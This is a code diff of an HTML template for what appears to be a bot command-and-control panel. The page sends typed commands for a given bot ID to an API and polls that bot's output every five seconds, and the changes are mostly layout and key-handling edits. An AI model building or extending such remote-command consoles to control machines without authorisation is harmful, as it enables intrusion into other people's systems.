@@ -9,7 +9,7 @@
     <title>{{botid}}</title>
   </head>
 
-  <body>
+  <body onkeypress="keypressed(event)">
     <header>
       <div class="container">
         <h1>{{botid}}</h1>
@@ -18,46 +18,53 @@
       </div>
     </header>
 
-    <div class="container"> 
-	<section id="main_content">
-		
-		<pre id="terminal" style="width:80%;"></pre>
-		
-		<input type="text" name="cmd" id="cmd" onkeypress="keypressed(event)" style="width: 50%" />
-		<button type="submit" onclick="send_command()">Send</button>
+    <div class="container">
+        <section id="main_content">
 
-        <br><br>
+			<div id="terminal">
+				<pre id="scrollable">
+					<div id="txt">
+					</div>
+				</pre>
+			</div>
 
-		<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
-		<script>
-		function keypressed(e){
-		    if(e.keyCode === 13){
-			send_command();
-		    }
-		    return false;
-		}
-		function send_command(e) {
-		    $.post("../api/push", {'botid': '{{botid}}', 'cmd': $('#cmd').val()});
-		    $('#cmd').val('');
-		    return false;
-		}
-		function refresh_term() {
-		    $('#terminal').load("../api/stdout?botid={{botid}}");
-            if (!$('#terminal').is(':hover')) {
-               termdiv = document.getElementById('terminal');
-               termdiv.scrollTop = termdiv.scrollHeight;
-            }
-            
-		}
-		setInterval(refresh_term, 5000)
-		$(document).ready(function(){
-		    refresh_term();
-		});
+            <br><br>
+			<input type="text" name="cmd" id="cmd" onkeypress="keypressed(event)" />
+			<button type="submit" onclick="send_command()">Send</button>
 
-		</script>
+			<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+			<script>
+				function keypressed(e){
+					if(e.keyCode === 13){
+						send_command();
+					}
+					else
+					{
+						document.getElementById("cmd").focus();
+					}
+					return false;
+				}
+				function send_command(e) {
+					$.post("../api/push", {'botid': '{{botid}}', 'cmd': $('#cmd').val()});
+					$('#cmd').val('');
+					return false;
+				}
+				function refresh_term() {
+					$('#txt').load("../api/stdout?botid={{botid}}");
+					if (!$('#txt').is(':hover')) {
+					   termdiv = document.getElementById('scrollable');
+					   termdiv.scrollTop = termdiv.scrollHeight;
+					}
+				}
+				setInterval(refresh_term, 5000)
+				$(document).ready(function(){
+					refresh_term();
+				});
 
-	</section>
+            </script>
+
+        </section>
     </div>
-  
+
   </body>
 </html>
